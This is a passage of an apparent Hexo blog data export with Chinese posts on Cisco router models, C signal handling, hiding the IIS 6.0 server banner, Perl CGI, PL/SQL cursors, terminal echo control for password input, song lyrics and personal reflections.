2个10/100M以太网络接口、1个NM模块插槽、2个WIC插槽、1个AIM插槽、32M闪存、128M内存</p>CISCO2650XM&#160;&#160;&#160;&#160;1个10/100M以太网络接口、1个NM模块插槽、2个WIC插槽、1个AIM插槽、32M闪存、256M内存<p>CISCO2651XM&#160;&#160;&#160; 2个10/100M以太网络接口、1个NM模块插槽、2个WIC插槽、1个AIM插槽、32M闪存、256M内存</p><p>CISCO2691&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;  2个10/100M以太网络接口、1个NM模块插槽、3个WIC插槽、1个AIM插槽、32M闪存、256M内存</p><p>Cisco Systems通过Cisco 2600系列将企业级的通用性、集成和功能扩展到了建立 以机构。随着新服务和运用  的面市，Cisco 2600系列的模块化体系结构能够提供适应网络技能 变化所需的通用性。Cisco  2600系列配置了强大的RISC处理器，能够支持当今不断发展的网络中所需的高级服务质量（QoS）、安全和网络集成特征 。通过将多个独立设备的功能集成到一个单元之中，Cisco 2600系列降低了管理远程网络的复杂性。Cisco 2600系列与Cisco  1600、1700和3600系列共享模块化接口，为Internet、内部网访问、多服务语音/数据集成、模拟和数字拨号访问服务、VPN访问、ATM 访问集中、VLAN以及路由带宽管理等运用  提供经济有效的处理 方案。</p><p>四&#160;&#160; .CISCO2800系列路由器</p><p>CISCO2801&#160;&#160;&#160;&#160;&#160;&#160; 2801 Router/AC PWR,2FE,4slots(2HWICs),2AIMS,IP  BASE,64F/128D</p><p>CISCO2811&#160;&#160;&#160;&#160;&#160;&#160; 2811 w/ AC PWR,2FE,4HWICs,2PVDMs,1NME,2AIMS,IP  BASE,64F/256D</p><p>CISCO2821&#160;&#160;&#160;&#160;&#160;&#160; 2821 w/ AC PWR,2GE,4HWICs,3PVDM,1NME-X,2AIM,IP  BASE,64F/256D</p><p>CISCO2851&#160;&#160;&#160;&#160;&#160;&#160;&#160; 2851 w/ AC PWR,2GE,4HWIC,3PVDM,1NME-XD,2AIM,IP  BASE,64F/256D</p><p>Cisco 2800系列包括四个平台：Cisco 2801、Cisco 2811、Cisco 2821和 Cisco  2851。与价格类似的前几代思科路由器相比，Cisco  2800系列可以将性能提升五倍，将安全和话音性能提升十倍，并且可以提供新的嵌入式服务选项，因而可以为客户提供主要 的附加值。它可以在大幅度提升插槽性能和密度的同时，支持Cisco 1700和2600系列中现有的90多种模块。</p><p>五 .CISCO3600系列路由器</p><p>Cisco 3600系列是一个适合大中型企业Internet服务供应商的模块化、多功能访问平台家族。Cisco  3600系列拥有70多个模块化接口]\n]>"},{"title":"一览众山小的感觉","date":"2010-04-19T12:05:00.000Z","_content":"今天学校挺电了，学校组织去外出活动，去爬山啦。那感觉让我悟出了很多道理。<br />当你一览众山小的时候，你必须付出努力和代价。<br />要想一览众山小你必须有这么多条件，就总结一下几点。 <br />1.有一个快速上的好路。<br />2.有一个坚强的信念。<br />3.有一个体力充沛的身体。<br />4.有前期的准备。<br />生活和爬山一样，有些是先天的因素，有些是后期的准备。<br />本来有许多话呢，不知道说什么好了。有些东西就让它记在心中吗、","source":"_posts/一览众山小的感觉.md","raw":"title: 一览众山小的感觉\ncategories: [生活感想]\ntags: []\ndate: 2010-04-19 20:05:00\n---\n今天学校挺电了，学校组织去外出活动，去爬山啦。那感觉让我悟出了很多道理。<br />当你一览众山小的时候，你必须付出努力和代价。<br />要想一览众山小你必须有这么多条件，就总结一下几点。 <br />1.有一个快速上的好路。<br />2.有一个坚强的信念。<br />3.有一个体力充沛的身体。<br />4.有前期的准备。<br />生活和爬山一样，有些是先天的因素，有些是后期的准备。<br />本来有许多话呢，不知道说什么好了。有些东西就让它记在心中吗、","slug":"一览众山小的感觉","published":1,"updated":"2023-04-22T05:38:44.958Z","_id":"clgrjlxma00c37opi3ig701uc","comments":1,"layout":"post","photos":[],"link":"","content":"<p>今天学校挺电了，学校组织去外出活动，去爬山啦。那感觉让我悟出了很多道理。<br />当你一览众山小的时候，你必须付出努力和代价。<br />要想一览众山小你必须有这么多条件，就总结一下几点。 <br />1.有一个快速上的好路。<br />2.有一个坚强的信念。<br />3.有一个体力充沛的身体。<br />4.有前期的准备。<br />生活和爬山一样，有些是先天的因素，有些是后期的准备。<br />本来有许多话呢，不知道说什么好了。有些东西就让它记在心中吗、</p>\n","site":{"data":{}},"excerpt":"","more":"<p>今天学校挺电了，学校组织去外出活动，去爬山啦。那感觉让我悟出了很多道理。<br />当你一览众山小的时候，你必须付出努力和代价。<br />要想一览众山小你必须有这么多条件，就总结一下几点。 <br />1.有一个快速上的好路。<br />2.有一个坚强的信念。<br />3.有一个体力充沛的身体。<br />4.有前期的准备。<br />生活和爬山一样，有些是先天的因素，有些是后期的准备。<br />本来有许多话呢，不知道说什么好了。有些东西就让它记在心中吗、</p>\n"},{"title":"云计算增强模型","date":"2013-04-13T04:44:28.000Z","_content":"云计算增强模型一个很容易理解的图，推荐给大家。\n<a href=\"/images/2013/04/20121227043051520.png\"><img src=\"/images/2013/04/20121227043051520-300x223.png\" alt=\"20121227043051520\" width=\"300\" height=\"223\" class=\"alignnone size-medium wp-image-349\" /></a>","source":"_posts/云计算增强模型.md","raw":"title: 云计算增强模型\ncategories: [操作系统,Linux]\ntags: [云计算]\ndate: 2013-04-13 12:44:28\n---\n云计算增强模型一个很容易理解的图，推荐给大家。\n<a href=\"/images/2013/04/20121227043051520.png\"><img src=\"/images/2013/04/20121227043051520-300x223.png\" alt=\"20121227043051520\" width=\"300\" height=\"223\" class=\"alignnone size-medium wp-image-349\" /></a>","slug":"云计算增强模型","published":1,"updated":"2023-04-22T05:38:44.974Z","_id":"clgrjlxmb00c47opicicjgyu8","comments":1,"layout":"post","photos":[],"link":"","content":"<p>云计算增强模型一个很容易理解的图，推荐给大家。<br><a href=\"/images/2013/04/20121227043051520.png\"><img src=\"/images/2013/04/20121227043051520-300x223.png\" alt=\"20121227043051520\" width=\"300\" height=\"223\" class=\"alignnone size-medium wp-image-349\" /></a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>云计算增强模型一个很容易理解的图，推荐给大家。<br><a href=\"/images/2013/04/20121227043051520.png\"><img src=\"/images/2013/04/20121227043051520-300x223.png\" alt=\"20121227043051520\" width=\"300\" height=\"223\" class=\"alignnone size-medium wp-image-349\" /></a></p>\n"},{"title":"子进程的返回值问题status","date":"2013-06-19T08:53:59.000Z","_content":"最近有一个程序，转移到另一台服务器上了，在接受返回值的时候一直出问题。\n<pre>\nwaitpid(pid, &status, WNOHANG);\n</pre>\nWEXITSTATUS(status)老实返回16，郁闷。\n最后发现是信号的问题。在fork子进程前，添加对子进程的信号接受就可以了。\n<pre>\nsignal(SIGCHLD,SIG_DFL);\n</pre>","source":"_posts/子进程的返回值问题status.md","raw":"title: 子进程的返回值问题status\ncategories: [C编程]\ntags: []\ndate: 2013-06-19 16:53:59\n---\n最近有一个程序，转移到另一台服务器上了，在接受返回值的时候一直出问题。\n<pre>\nwaitpid(pid, &status, WNOHANG);\n</pre>\nWEXITSTATUS(status)老实返回16，郁闷。\n最后发现是信号的问题。在fork子进程前，添加对子进程的信号接受就可以了。\n<pre>\nsignal(SIGCHLD,SIG_DFL);\n</pre>","slug":"子进程的返回值问题status","published":1,"updated":"2023-04-22T05:38:45.034Z","_id":"clgrjlxmc00c57opi53zwdcek","comments":1,"layout":"post","photos":[],"link":"","content":"<p>最近有一个程序，转移到另一台服务器上了，在接受返回值的时候一直出问题。</p>\n<pre>\nwaitpid(pid, &status, WNOHANG);\n</pre>\n<p>WEXITSTATUS(status)老实返回16，郁闷。<br>最后发现是信号的问题。在fork子进程前，添加对子进程的信号接受就可以了。</p>\n<pre>\nsignal(SIGCHLD,SIG_DFL);\n</pre>","site":{"data":{}},"excerpt":"","more":"<p>最近有一个程序，转移到另一台服务器上了，在接受返回值的时候一直出问题。</p>\n<pre>\nwaitpid(pid, &status, WNOHANG);\n</pre>\n<p>WEXITSTATUS(status)老实返回16，郁闷。<br>最后发现是信号的问题。在fork子进程前，添加对子进程的信号接受就可以了。</p>\n<pre>\nsignal(SIGCHLD,SIG_DFL);\n</pre>"},{"title":"修改IIS6.0Banner信息","date":"2012-04-12T00:30:00.000Z","_content":"<p>在做安全检测的时候，我们一般都会利用Nmap等扫描器对目标站进行扫描，以获取信息，方便入侵。作为站长的我们可以利用一点小技巧来屏蔽服务器的返回信息，达到隐藏敏感信息的目的。这里介绍一下如何修改IIS6.0的banner信息。网上收集的方法，已经测试过可行。</p><p>1、win2003有系统文件保护，在c:windowssystem32dllcache里删除w3core.dll或者同时替换这里的w3core.dll</p><p>2、用Uedit32打开c:windowssystem32inetsrvw3core.dll。</p><p>3、直接搜索关键字6.0要勾选ascii</p><p>4、搜索到了直接改，随你怎么改。我就改成8.0</p><p>5、停止IIS Admin Service服务，再保存对w3core.dll的修改。如果还是保存不了，就用attrib -R修改它的属性。还不行你就另存为其他名字，然后想办法删了原w3core.dll，之后再将新文件换成该名字即可。</p><p>6、启动IIS Admin Service服务，然后对该服务再重启次，不行就重启系统。</p><p><a href=\"http://www.waitalone.cn/upload/201204111710128104.png\"><img style=\"width: 520px;\" src=\"/images/pic/e030b33e70cf3bc72bf5f44dd100baa1cc112a52.jpg\" /></a></p><p>IIS8.0？win8？蛋疼了吧。</p><p>原文地址：http://www.2cto.com/Article/201111/110201.html</p>","source":"_posts/修改IIS6.0Banner信息.md","raw":"title: 修改IIS6.0Banner信息\ncategories: [网络安全]\ntags: []\ndate: 2012-04-12 08:30:00\n---\n<p>在做安全检测的时候，我们一般都会利用Nmap等扫描器对目标站进行扫描，以获取信息，方便入侵。作为站长的我们可以利用一点小技巧来屏蔽服务器的返回信息，达到隐藏敏感信息的目的。这里介绍一下如何修改IIS6.0的banner信息。网上收集的方法，已经测试过可行。</p><p>1、win2003有系统文件保护，在c:windowssystem32dllcache里删除w3core.dll或者同时替换这里的w3core.dll</p><p>2、用Uedit32打开c:windowssystem32inetsrvw3core.dll。</p><p>3、直接搜索关键字6.0要勾选ascii</p><p>4、搜索到了直接改，随你怎么改。我就改成8.0</p><p>5、停止IIS Admin Service服务，再保存对w3core.dll的修改。如果还是保存不了，就用attrib -R修改它的属性。还不行你就另存为其他名字，然后想办法删了原w3core.dll，之后再将新文件换成该名字即可。</p><p>6、启动IIS Admin Service服务，然后对该服务再重启次，不行就重启系统。</p><p><a href=\"http://www.waitalone.cn/upload/201204111710128104.png\"><img style=\"width: 520px;\" src=\"/images/pic/e030b33e70cf3bc72bf5f44dd100baa1cc112a52.jpg\" /></a></p><p>IIS8.0？win8？蛋疼了吧。</p><p>原文地址：http://www.2cto.com/Article/201111/110201.html</p>","slug":"修改IIS6.0Banner信息","published":1,"updated":"2023-04-22T05:38:44.991Z","_id":"clgrjlxme00c87opi7w2c3uq3","comments":1,"layout":"post","photos":[],"link":"","content":"<p>在做安全检测的时候，我们一般都会利用Nmap等扫描器对目标站进行扫描，以获取信息，方便入侵。作为站长的我们可以利用一点小技巧来屏蔽服务器的返回信息，达到隐藏敏感信息的目的。这里介绍一下如何修改IIS6.0的banner信息。网上收集的方法，已经测试过可行。</p><p>1、win2003有系统文件保护，在c:windowssystem32dllcache里删除w3core.dll或者同时替换这里的w3core.dll</p><p>2、用Uedit32打开c:windowssystem32inetsrvw3core.dll。</p><p>3、直接搜索关键字6.0要勾选ascii</p><p>4、搜索到了直接改，随你怎么改。我就改成8.0</p><p>5、停止IIS Admin Service服务，再保存对w3core.dll的修改。如果还是保存不了，就用attrib -R修改它的属性。还不行你就另存为其他名字，然后想办法删了原w3core.dll，之后再将新文件换成该名字即可。</p><p>6、启动IIS Admin Service服务，然后对该服务再重启次，不行就重启系统。</p><p><a href=\"http://www.waitalone.cn/upload/201204111710128104.png\"><img style=\"width: 520px;\" src=\"/images/pic/e030b33e70cf3bc72bf5f44dd100baa1cc112a52.jpg\" /></a></p><p>IIS8.0？win8？蛋疼了吧。</p><p>原文地址：http://www.2cto.com/Article/201111/110201.html</p>","site":{"data":{}},"excerpt":"","more":"<p>在做安全检测的时候，我们一般都会利用Nmap等扫描器对目标站进行扫描，以获取信息，方便入侵。作为站长的我们可以利用一点小技巧来屏蔽服务器的返回信息，达到隐藏敏感信息的目的。这里介绍一下如何修改IIS6.0的banner信息。网上收集的方法，已经测试过可行。</p><p>1、win2003有系统文件保护，在c:windowssystem32dllcache里删除w3core.dll或者同时替换这里的w3core.dll</p><p>2、用Uedit32打开c:windowssystem32inetsrvw3core.dll。</p><p>3、直接搜索关键字6.0要勾选ascii</p><p>4、搜索到了直接改，随你怎么改。我就改成8.0</p><p>5、停止IIS Admin Service服务，再保存对w3core.dll的修改。如果还是保存不了，就用attrib -R修改它的属性。还不行你就另存为其他名字，然后想办法删了原w3core.dll，之后再将新文件换成该名字即可。</p><p>6、启动IIS Admin Service服务，然后对该服务再重启次，不行就重启系统。</p><p><a href=\"http://www.waitalone.cn/upload/201204111710128104.png\"><img style=\"width: 520px;\" src=\"/images/pic/e030b33e70cf3bc72bf5f44dd100baa1cc112a52.jpg\" /></a></p><p>IIS8.0？win8？蛋疼了吧。</p><p>原文地址：http://www.2cto.com/Article/201111/110201.html</p>"},{"title":"用perl 下cgi-bin 注意事项","date":"2011-04-10T14:44:00.000Z","_content":"1.script第一行...\n#!/usr/bin/perl\n和shell一样的。\n2、\nprint &quot;Content-type: text/htmlnn&quot;;\n网页头文件信息。\n3.下面就是相应的perl语法和模块。","source":"_posts/用perl-下cgi-bin-注意事项.md","raw":"title: 用perl 下cgi-bin 注意事项\ncategories: [Perl编程]\ntags: []\ndate: 2011-04-10 22:44:00\n---\n1.script第一行...\n#!/usr/bin/perl\n和shell一样的。\n2、\nprint &quot;Content-type: text/htmlnn&quot;;\n网页头文件信息。\n3.下面就是相应的perl语法和模块。","slug":"用perl-下cgi-bin-注意事项","published":1,"updated":"2023-04-22T05:38:45.112Z","_id":"clgrjlxmf00ca7opife1b1u8p","comments":1,"layout":"post","photos":[],"link":"","content":"<p>1.script第一行…<br>#!&#x2F;usr&#x2F;bin&#x2F;perl<br>和shell一样的。<br>2、<br>print &quot;Content-type: text&#x2F;htmlnn&quot;;<br>网页头文件信息。<br>3.下面就是相应的perl语法和模块。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>1.script第一行…<br>#!&#x2F;usr&#x2F;bin&#x2F;perl<br>和shell一样的。<br>2、<br>print &quot;Content-type: text&#x2F;htmlnn&quot;;<br>网页头文件信息。<br>3.下面就是相应的perl语法和模块。</p>\n"},{"title":"欲速则不达","date":"2016-08-02T16:38:20.000Z","_content":"欲速则不达，切记","source":"_posts/欲速则不达.md","raw":"title: 欲速则不达\ncategories: [生活感想]\ntags: []\ndate: 2016-08-03 00:38:20\n---\n欲速则不达，切记","slug":"欲速则不达","published":1,"updated":"2023-04-22T05:38:45.090Z","_id":"clgrjlxmg00cc7opihhwp4i8w","comments":1,"layout":"post","photos":[],"link":"","content":"<p>欲速则不达，切记</p>\n","site":{"data":{}},"excerpt":"","more":"<p>欲速则不达，切记</p>\n"},{"title":"用PLSQL简单实现游标","date":"2013-11-19T14:44:42.000Z","_content":"PLSQL编程简单实现游标\n<pre>\ndeclare\nv_userid   t_eb_user.userid%TYPE;\nv_username t_eb_user.username%TYPE;\ncursor emp_cursor is\n select a.userid,a.username from t_eb_user a, t_eb_tables b where a.userid=b.userid;\nbegin\n  open emp_cursor;\nLOOP\n  FETCH emp_cursor INTO v_userid, v_username;\n  EXIT WHEN emp_cursor%NOTFOUND;\n  dbms_output.put_line(v_userid||' '||v_username);\nEND LOOP;\nend;\n</pre>","source":"_posts/用PLSQL简单实现游标.md","raw":"title: 用PLSQL简单实现游标\ncategories: [Oracle,数据库]\ntags: []\ndate: 2013-11-19 22:44:42\n---\nPLSQL编程简单实现游标\n<pre>\ndeclare\nv_userid   t_eb_user.userid%TYPE;\nv_username t_eb_user.username%TYPE;\ncursor emp_cursor is\n select a.userid,a.username from t_eb_user a, t_eb_tables b where a.userid=b.userid;\nbegin\n  open emp_cursor;\nLOOP\n  FETCH emp_cursor INTO v_userid, v_username;\n  EXIT WHEN emp_cursor%NOTFOUND;\n  dbms_output.put_line(v_userid||' '||v_username);\nEND LOOP;\nend;\n</pre>","slug":"用PLSQL简单实现游标","published":1,"updated":"2023-04-22T05:38:45.110Z","_id":"clgrjlxmh00cf7opi1wlu8eeg","comments":1,"layout":"post","photos":[],"link":"","content":"<p>PLSQL编程简单实现游标</p>\n<pre>\ndeclare\nv_userid   t_eb_user.userid%TYPE;\nv_username t_eb_user.username%TYPE;\ncursor emp_cursor is\n select a.userid,a.username from t_eb_user a, t_eb_tables b where a.userid=b.userid;\nbegin\n  open emp_cursor;\nLOOP\n  FETCH emp_cursor INTO v_userid, v_username;\n  EXIT WHEN emp_cursor%NOTFOUND;\n  dbms_output.put_line(v_userid||' '||v_username);\nEND LOOP;\nend;\n</pre>","site":{"data":{}},"excerpt":"","more":"<p>PLSQL编程简单实现游标</p>\n<pre>\ndeclare\nv_userid   t_eb_user.userid%TYPE;\nv_username t_eb_user.username%TYPE;\ncursor emp_cursor is\n select a.userid,a.username from t_eb_user a, t_eb_tables b where a.userid=b.userid;\nbegin\n  open emp_cursor;\nLOOP\n  FETCH emp_cursor INTO v_userid, v_username;\n  EXIT WHEN emp_cursor%NOTFOUND;\n  dbms_output.put_line(v_userid||' '||v_username);\nEND LOOP;\nend;\n</pre>"},{"title":"真实一点","date":"2012-11-07T07:01:00.000Z","_content":"<p><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;真实一点<br />演唱：姜玉阳<br /><br />伫立在人群中<br />思绪突然凝固<br />视线像被封锁住<br />冬季傍晚很冷<br />擦肩而过的人<br />都比了解彼此来时的路<br /><br />其实生活是梦<br />渐渐多些领悟<br />欲望会让人容易迷途<br />偶尔潇潇洒洒<br />装作比别人幸福<br />炫耀的神采掩饰不住<br /><br />每个阶段有每个阶段的脚步<br />花开花落何时笑何时哭<br />想到自己和身边的朋友<br />除了快乐还有什么值得嫉妒<br /><br />追求啊&nbsp;现实一点<br />可以收获幸福<br />爱情啊&nbsp;真诚一点<br />可以细水长流<br />生活啊&nbsp;真实一点<br />让心灵接受感动<br />老朋友&nbsp;致一杯酒<br />牵挂祝福永久<br /><br />其实生活是梦<br />渐渐多些领悟<br />欲望会让人容易迷途<br />偶尔潇潇洒洒<br />装作比别人幸福<br />炫耀的神采掩饰不住<br /><br />每个阶段有每个阶段的脚步<br />花开花落何时笑何时哭<br />想到自己和身边的朋友<br />除了快乐还有什么值得嫉妒<br /><br />追求啊&nbsp;现实一点<br />可以收获幸福<br />爱情啊&nbsp;真诚一点<br />可以细水长流<br />生活啊&nbsp;真实一点<br />让心灵接受感动<br />老朋友&nbsp;致一杯酒<br />牵挂祝福永久<br /><br />追求啊&nbsp;现实一点<br />可以收获幸福<br />爱情啊&nbsp;真诚一点<br />可以细水长流<br />生活啊&nbsp;真实一点<br />让心灵接受感动<br />老朋友&nbsp;致一杯酒<br />牵挂祝福永久<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br /><br /></p>","source":"_posts/真实一点.md","raw":"title: 真实一点\ncategories: [生活感想]\ntags: []\ndate: 2012-11-07 15:01:00\n---\n<p><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;真实一点<br />演唱：姜玉阳<br /><br />伫立在人群中<br />思绪突然凝固<br />视线像被封锁住<br />冬季傍晚很冷<br />擦肩而过的人<br />都比了解彼此来时的路<br /><br />其实生活是梦<br />渐渐多些领悟<br />欲望会让人容易迷途<br />偶尔潇潇洒洒<br />装作比别人幸福<br />炫耀的神采掩饰不住<br /><br />每个阶段有每个阶段的脚步<br />花开花落何时笑何时哭<br />想到自己和身边的朋友<br />除了快乐还有什么值得嫉妒<br /><br />追求啊&nbsp;现实一点<br />可以收获幸福<br />爱情啊&nbsp;真诚一点<br />可以细水长流<br />生活啊&nbsp;真实一点<br />让心灵接受感动<br />老朋友&nbsp;致一杯酒<br />牵挂祝福永久<br /><br />其实生活是梦<br />渐渐多些领悟<br />欲望会让人容易迷途<br />偶尔潇潇洒洒<br />装作比别人幸福<br />炫耀的神采掩饰不住<br /><br />每个阶段有每个阶段的脚步<br />花开花落何时笑何时哭<br />想到自己和身边的朋友<br />除了快乐还有什么值得嫉妒<br /><br />追求啊&nbsp;现实一点<br />可以收获幸福<br />爱情啊&nbsp;真诚一点<br />可以细水长流<br />生活啊&nbsp;真实一点<br />让心灵接受感动<br />老朋友&nbsp;致一杯酒<br />牵挂祝福永久<br /><br />追求啊&nbsp;现实一点<br />可以收获幸福<br />爱情啊&nbsp;真诚一点<br />可以细水长流<br />生活啊&nbsp;真实一点<br />让心灵接受感动<br />老朋友&nbsp;致一杯酒<br />牵挂祝福永久<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br /><br /></p>","slug":"真实一点","published":1,"updated":"2023-04-22T05:38:45.117Z","_id":"clgrjlxmk00cm7opid2cfds8t","comments":1,"layout":"post","photos":[],"link":"","content":"<p><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;真实一点<br />演唱：姜玉阳<br /><br />伫立在人群中<br />思绪突然凝固<br />视线像被封锁住<br />冬季傍晚很冷<br />擦肩而过的人<br />都比了解彼此来时的路<br /><br />其实生活是梦<br />渐渐多些领悟<br />欲望会让人容易迷途<br />偶尔潇潇洒洒<br />装作比别人幸福<br />炫耀的神采掩饰不住<br /><br />每个阶段有每个阶段的脚步<br />花开花落何时笑何时哭<br />想到自己和身边的朋友<br />除了快乐还有什么值得嫉妒<br /><br />追求啊&nbsp;现实一点<br />可以收获幸福<br />爱情啊&nbsp;真诚一点<br />可以细水长流<br />生活啊&nbsp;真实一点<br />让心灵接受感动<br />老朋友&nbsp;致一杯酒<br />牵挂祝福永久<br /><br />其实生活是梦<br />渐渐多些领悟<br />欲望会让人容易迷途<br />偶尔潇潇洒洒<br />装作比别人幸福<br />炫耀的神采掩饰不住<br /><br />每个阶段有每个阶段的脚步<br />花开花落何时笑何时哭<br />想到自己和身边的朋友<br />除了快乐还有什么值得嫉妒<br /><br />追求啊&nbsp;现实一点<br />可以收获幸福<br />爱情啊&nbsp;真诚一点<br />可以细水长流<br />生活啊&nbsp;真实一点<br />让心灵接受感动<br />老朋友&nbsp;致一杯酒<br />牵挂祝福永久<br /><br />追求啊&nbsp;现实一点<br />可以收获幸福<br />爱情啊&nbsp;真诚一点<br />可以细水长流<br />生活啊&nbsp;真实一点<br />让心灵接受感动<br />老朋友&nbsp;致一杯酒<br />牵挂祝福永久<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br /><br /></p>","site":{"data":{}},"excerpt":"","more":"<p><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;真实一点<br />演唱：姜玉阳<br /><br />伫立在人群中<br />思绪突然凝固<br />视线像被封锁住<br />冬季傍晚很冷<br />擦肩而过的人<br />都比了解彼此来时的路<br /><br />其实生活是梦<br />渐渐多些领悟<br />欲望会让人容易迷途<br />偶尔潇潇洒洒<br />装作比别人幸福<br />炫耀的神采掩饰不住<br /><br />每个阶段有每个阶段的脚步<br />花开花落何时笑何时哭<br />想到自己和身边的朋友<br />除了快乐还有什么值得嫉妒<br /><br />追求啊&nbsp;现实一点<br />可以收获幸福<br />爱情啊&nbsp;真诚一点<br />可以细水长流<br />生活啊&nbsp;真实一点<br />让心灵接受感动<br />老朋友&nbsp;致一杯酒<br />牵挂祝福永久<br /><br />其实生活是梦<br />渐渐多些领悟<br />欲望会让人容易迷途<br />偶尔潇潇洒洒<br />装作比别人幸福<br />炫耀的神采掩饰不住<br /><br />每个阶段有每个阶段的脚步<br />花开花落何时笑何时哭<br />想到自己和身边的朋友<br />除了快乐还有什么值得嫉妒<br /><br />追求啊&nbsp;现实一点<br />可以收获幸福<br />爱情啊&nbsp;真诚一点<br />可以细水长流<br />生活啊&nbsp;真实一点<br />让心灵接受感动<br />老朋友&nbsp;致一杯酒<br />牵挂祝福永久<br /><br />追求啊&nbsp;现实一点<br />可以收获幸福<br />爱情啊&nbsp;真诚一点<br />可以细水长流<br />生活啊&nbsp;真实一点<br />让心灵接受感动<br />老朋友&nbsp;致一杯酒<br />牵挂祝福永久<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br /><br /></p>"},{"title":"用tcgetattr、tcsetattr实现密码输入框","date":"2014-09-17T14:31:19.000Z","_content":"在读ptrunnel的代码时，发现一个很好的用法记录一下，可用于密码的输入框，不回显输入内容，可用于很多场景。\n代码如下：\n<pre>\nstatic int terminal_echo_off(int fd)\n{\nstruct termios term;\nif (isatty(fd) == 0)\n{\n#ifdef DEBUG\nprintf(\"the file %i is not a terminaln\", fd);\n#endif /* DEBUG */\nreturn -1;\n}\nif (tcgetattr(fd, &term) < 0)\n{\n#ifdef DEBUG\nperror(\"tcgetattr: \");\n#endif /* DEBUG */\nreturn -1;\n}\nterm.c_lflag &= ~ECHO;\nif (tcsetattr(fd, TCSANOW, &term) < 0)\n{\n#ifdef DEBUG\nperror(\"tcsetattr: \");\n#endif /* DEBUG */\nreturn -1;\n}\nreturn 0;\n}\nstatic int terminal_echo_on(int fd)\n{\nstruct termios term;\nif (isatty(fd) == 0)\n{\n#ifdef DEBUG\nprintf(\"the file %i is not a terminaln\", fd);\n#endif /* DEBUG */\nreturn -1;\n}\nif (tcgetattr(fd, &term) < 0)\n{\n#ifdef DEBUG\nperror(\"tcgetattr: \");\n#endif /* DEBUG */\nreturn -1;\n}\nterm.c_lflag |= ECHO;\nif (tcsetattr(fd, TCSANOW, &term) < 0)\n{\n#ifdef DEBUG\nperror(\"tcsetattr: \");\n#endif /* DEBUG */\nreturn -1;\n}\nreturn 0;\n}\n</pre>","source":"_posts/用tcgetattr、tcsetattr实现密码输入框.md","raw":"title: 用tcgetattr、tcsetattr实现密码输入框\ncategories: [Linux,C编程]\ntags: []\ndate: 2014-09-17 22:31:19\n---\n在读ptrunnel的代码时，发现一个很好的用法记录一下，可用于密码的输入框，不回显输入内容，可用于很多场景。\n代码如下：\n<pre>\nstatic int terminal_echo_off(int fd)\n{\nstruct termios term;\nif (isatty(fd) == 0)\n{\n#ifdef DEBUG\nprintf(\"the file %i is not a terminaln\", fd);\n#endif /* DEBUG */\nreturn -1;\n}\nif (tcgetattr(fd, &term) < 0)\n{\n#ifdef DEBUG\nperror(\"tcgetattr: \");\n#endif /* DEBUG */\nreturn -1;\n}\nterm.c_lflag &= ~ECHO;\nif (tcsetattr(fd, TCSANOW, &term) < 0)\n{\n#ifdef DEBUG\nperror(\"tcsetattr: \");\n#endif /* DEBUG */\nreturn -1;\n}\nreturn 0;\n}\nstatic int terminal_echo_on(int fd)\n{\nstruct termios term;\nif (isatty(fd) == 0)\n{\n#ifdef DEBUG\nprintf(\"the file %i is not a terminaln\", fd);\n#endif /* DEBUG */\nreturn -1;\n}\nif (tcgetattr(fd, &term) < 0)\n{\n#ifdef DEBUG\nperror(\"tcgetattr: \");\n#endif /* DEBUG */\nreturn -1;\n}\nterm.c_lflag |= ECHO;\nif (tcsetattr(fd, TCSANOW, &term) < 0)\n{\n#ifdef DEBUG\nperror(\"tcsetattr: \");\n#endif /* DEBUG */\nreturn -1;\n}\nreturn 0;\n}\n</pre>","slug":"用tcgetattr、tcsetattr实现密码输入框","published":1,"updated":"2023-04-22T05:38:45.115Z","_id":"clgrjlxmn00co7opi1v9546c7","comments":1,"layout":"post","photos":[],"link":"","content":"<p>在读ptrunnel的代码时，发现一个很好的用法记录一下，可用于密码的输入框，不回显输入内容，可用于很多场景。<br>代码如下：</p>\n<pre>\nstatic int terminal_echo_off(int fd)\n{\nstruct termios term;\nif (isatty(fd) == 0)\n{\n#ifdef DEBUG\nprintf(\"the file %i is not a terminaln\", fd);\n#endif /* DEBUG */\nreturn -1;\n}\nif (tcgetattr(fd, &term) < 0)\n{\n#ifdef DEBUG\nperror(\"tcgetattr: \");\n#endif /* DEBUG */\nreturn -1;\n}\nterm.c_lflag &= ~ECHO;\nif (tcsetattr(fd, TCSANOW, &term) < 0)\n{\n#ifdef DEBUG\nperror(\"tcsetattr: \");\n#endif /* DEBUG */\nreturn 